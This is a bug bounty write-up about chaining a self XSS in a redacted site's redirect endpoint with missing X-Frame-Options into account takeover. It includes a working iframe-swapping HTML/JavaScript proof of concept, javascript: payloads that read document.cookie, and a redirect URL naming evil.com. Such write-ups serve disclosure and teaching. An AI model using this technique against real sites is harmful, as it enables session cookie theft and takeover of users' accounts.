# Chaining a self XSS to Account Takeover

Hello, 
It's been a really long time since I shared any of my research/ findings lately, but in this writeup I'll share a vulnerability I found which was quite interesting to me and might change your perception towards "SELF XSS"

### Getting started

I usually, manually check any application when I'm really looking for vulnerabilities like Open Redirect or XSS to find parameter which other hackers extra-ordinary tools might have missed :D

So while going through alot of different endpoints and fuzzing through alot different of parameters, I didn't find anything of my interest as the program was a 4 year old well tested program, tested by alot professional researchers, But I dont know why I really wanted to find a vulnerability in this target as my homie [Kartik Sharma](https://twitter.com/dominat0r98) found a really cool Stored XSS on this target which lead to Massive Account takeovers ps: (Shoot him a DM and must ask him to write about it) 

Let's come back to the point, After spending alot of days back and forth on this target, I finally came accross a endpoint which looked something like 
`https://redacted.com/redirect/<url-path>` which was a simple Open Redirect wait not even a Open Redirect because it gave a Warning message like this

<img width="1010" alt="Screen Shot 2021-01-24 at 12 46 48 AM" src="https://user-images.githubusercontent.com/65326024/105656287-dd3c8f80-5e8f-11eb-8b0d-f83d3a7fdb52.png">

Now, Out of curiosity I changed the endpoint from `https://redacted.com/redirect/javascript:alert(1)` and pressed the continue option to see what happens and alert(1) popped up as you can see in the below image
 
<img width="1210" alt="Screen Shot 2021-01-24 at 10 09 20 PM" src="https://user-images.githubusercontent.com/65326024/105657128-bda66680-5e91-11eb-8e84-f7a7a5e7562d.png">

  
## Challenging side 
But, here is the challenging side. Just to be sure I copied the endpoint which is `https://redacted.com/redirect/javascript:alert(1)` and opened in a different browser and the continue to site option dissapeared like this in the image below...

<img width="974" alt="Screen Shot 2021-01-24 at 10 25 18 PM" src="https://user-images.githubusercontent.com/65326024/105657740-13c7d980-5e93-11eb-839c-f776b1ff4ef3.png">


resulting in 0 impact vulnerability from this point not even a legit self xss . If you didn't understand this behaviour let me explain those who didn't get it, it's because the regex is detecting special characters like " ' > * /> and removing the continue to site option as soon as it detects any special characters after /#redirect which means I came to situation like dead end :o

Now, After almost 100 fail attempts and googling alot I didn't came up with a solution or a similar scenario like this in anyone's writeup or any blog, I decided to quit, yes quit :(

After almost 15 days I was normally having a word with [Milind Purswani](https://twitter.com/MilindPurswani) and out of nowhere I explained him.... I came accross such scenario and asked him if he had any solution or any past research/ exploitation to such scenarios to my surprise he came up with a solution :D

## Exploitation

Now, the exploitation part here is to check whether the endpoint i.e: `https://redacted.com/redirect/javascript:alert(1)` has a X-FRAME OPTIONS enabled or not , I got lucky and yes this endpoint didn't had  X-FRAME OPTIONS enabled which means I can write a js code and host it on my website and further exploit this vulnerability :D Didn't get it? Let me briefly explain it.

So here's what I did wrote this javascript snippet and hosted the endpoint in an iframe on my server controlled by my Javascript code :D

```
html
<html>
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>Changing Pages... Please Wait</title>
    </head>
    <body>
        <iframe src="" name="frame" id="frame" width="100%" height="100%"></iframe>
        <script type="text/javascript">
            var frames = Array('https://redacted.com/#/redirect/https://@evil.com\\@www.redacted.com', 3,
                'https://redacted.com/#/redirect/javascript:alert(document.domain)', 37);
            var i = 0, len = frames.length;
            function ChangeSrc()
            {
            document.getElementById('frame').src = frames[i++];
            if (i >= len) return; // no more changing
            setTimeout('ChangeSrc()', (frames[i++]*1000));
            }
            window.onload = ChangeSrc();
        </script>
    </body>
</html>
```

So basically the vulnerability will now take advantage of the missing X-Frame-Options header that allows any page to load in an iframe. Once the page is loaded into an iframe, we call the `ChangeSrc()` function that replaces the valid URL `https://redacted.com/#/redirect/https://@evil.com\\@www.redacted.com` with a vulnerable URL which is `https://redacted.com/#/redirect/javascript:alert(document.cookie)`. Since there is no server side interaction involved, and the URL is replaced after the page is loaded, upon clicking the continue button, we can see that the XSS payload get's fired with the user's cookie (As you can see in the below image)

<img width="1165" alt="Screen Shot 2021-01-24 at 11 05 32 PM" src="https://user-images.githubusercontent.com/65326024/105660289-b2a30480-5e98-11eb-8aef-cc9dcf71f632.png">
  
  
Now, this creates an impact in a way which means when an Authenticated user visits my hosted server his/ her Authenticated cookie will pop up and will get sent to my server which means Account Takeover of any user of redacted.com with users one click :D

If you have any questions, ping me at [@ArmanSameer95](https://twitter.com/ArmanSameer95)

Thanks for reading, have a great rest of your day/ night!
 
 
